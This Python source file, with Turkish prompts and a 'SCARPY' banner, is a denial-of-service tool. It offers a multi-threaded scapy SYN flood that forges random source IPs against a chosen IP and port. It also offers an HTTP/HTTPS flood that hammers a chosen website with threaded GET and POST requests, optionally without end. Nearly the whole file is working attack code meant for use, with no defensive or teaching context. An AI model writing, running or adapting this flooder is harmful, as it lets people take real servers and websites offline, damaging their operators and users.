from scapy.all import *
import random
from os import *
from colorama import *
import requests
import threading
import time

init(autoreset=True)

#   ______                __           __   ____           _   __      __             ___ 
#  / ____/_______  ____ _/ /____  ____/ /  / __ )__  __   / | / /___ _/ /_  ___  ____/__ \
# / /   / ___/ _ \/ __ `/ __/ _ \/ __  /  / __  / / / /  /  |/ / __ `/ __ \/ _ \/ ___// _/
#/ /___/ /  /  __/ /_/ / /_/  __/ /_/ /  / /_/ / /_/ /  / /|  / /_/ / /_/ /  __/ /   /_/  
#\____/_/   \___/\__,_/\__/\___/\__,_/  /_____/\__, /  /_/ |_/\__,_/_.___/\___/_/   (_)   
#                                             /____/                                      

##########İP##########
def rastgele_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def randint():
    return random.randint(1000, 9000)

def SYN_Flood(hedefIP, dstPort, counter):
    total = 0
    for i in range(counter):
        IP_Packet = IP()
        IP_Packet.src = rastgele_ip()
        IP_Packet.dst = hedefIP

        TCP_Packet = TCP()
        TCP_Packet.sport = randint()
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = randint()
        TCP_Packet.window = randint()

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
        print(Fore.GREEN + f"{total}. Paket Gönderildi...")

    print(Fore.GREEN + f"\nToplam gönderilen paket sayısı: {total}\n")

def worker(hedefIP, hedefport, paket_sayısı):
    SYN_Flood(hedefIP, hedefport, paket_sayısı)

def get_info():
    os.system("clear" if os.name == "posix" else "cls")
    time.sleep(2)

    print(start)
    hedefIP = input(Fore.LIGHTBLACK_EX + "\nHedef IP: " + Fore.RED)
    hedefport = int(input(Fore.LIGHTBLACK_EX + "Hedef Port: " + Fore.RED))
    paket_sayısı = int(input(Fore.LIGHTBLACK_EX + "Kaç Tane Paket Gönderilsin: " + Fore.RED))
    Threads = int(input(Fore.LIGHTBLACK_EX + "Threads: " + Fore.RED))

    return hedefIP, hedefport, paket_sayısı, Threads

def ip_main():
    hedefIP, hedefport, paket_sayısı, Threads = get_info()

    threads = []
    for _ in range(Threads):
        thread = threading.Thread(target=worker, args=(hedefIP, hedefport, paket_sayısı))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

##########URL##########
headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
}

def urlfnk():
    system("cls||clear")
    print(start)
    target_url = input(Fore.LIGHTBLACK_EX+"Hedef WebSitesi:"+Fore.RED+" ")+(Fore.RESET)
    packet_count = int(input(Fore.LIGHTBLACK_EX + "Gönderilecek Paket Sayısını Seçin (sonsuz ise 0 yazın): " + Fore.RED))
    msg = input(Fore.LIGHTBLACK_EX+"Mesajınızı giriniz:"+Fore.RED+" ")+(Fore.RESET)
    threadnum = int(input(Fore.LIGHTBLACK_EX + "Threads:" + Fore.RED + " "))
    total = 0

    def send_request():
        nonlocal total
        while True:
            try:
                response = requests.get(target_url)
                requests.post(target_url, data={"message": msg})
                total += 1
                print(Fore.GREEN + f"{total}. Paket {msg} Mesajı İle Başarı İle Gönderildi!")
            except requests.exceptions.RequestException as e:
                total += 1
                print(Fore.RED + f"{total}. Paket Gönderilemedi! Hata: {e}")
            if packet_count != 0 and total >= packet_count:
                break

    if packet_count != 0:
        threads = []
        for _ in range(packet_count):
            thread = threading.Thread(target=send_request)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
        print(Fore.GREEN + f"\nToplam gönderilen paket sayısı: {total}"+Fore.RESET)
    else:
        number_of_threads = threadnum
        threads = []

        for i in range(number_of_threads):
            thread = threading.Thread(target=send_request)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
    def secildi():
        system("cls||clear")
        time.sleep(2)
        
start = (
      Fore.LIGHTRED_EX + "╔██████╗ ██████╗ █████╗ ██████╗ ██████╗ ██╗   ██╗\n"
    + Fore.RED + "██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝\n"
    + Fore.RED + "╚██████╗██║     ███████║██████╔╝██████╔╝ ╚████╔╝ \n"
    + Fore.LIGHTRED_EX + "╚════██║██║     ██╔══██║██╔══██╗██╔═══╝   ╚██╔╝  \n"
    + Fore.LIGHTBLACK_EX + "███████║╚██████╗██║  ██║██║  ██║██║        ██║   \n"
    + Fore.LIGHTBLACK_EX + "╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   \n"
    + Style.RESET_ALL
)

def scm():
    prompt = f"""{Fore.LIGHTBLACK_EX}   1: {Fore.RED}TCP{Fore.RESET}|{Fore.RED}SYN{Fore.RESET}|{Fore.RED}UDP{Fore.LIGHTBLACK_EX}
   2: {Fore.RED} HTTP{Fore.RESET}|{Fore.RED}HTTPS{Fore.RESET}
"""
    print(prompt +Fore.LIGHTBLACK_EX+ "\n   Seçiminizi yapın: ", end="")
    scm_input = input(Fore.RED)
    return scm_input

os.system("cls||clear")
print(start)
seçim = scm()

if seçim == "1":
    ip_main()
    os.system("cls||clear")
elif seçim == "2":
    urlfnk()
    os.system("cls||clear")
else:
    print(Fore.RED + "Hatalı Seçim Yaptınız!")
    time.sleep(0.5)
    seçim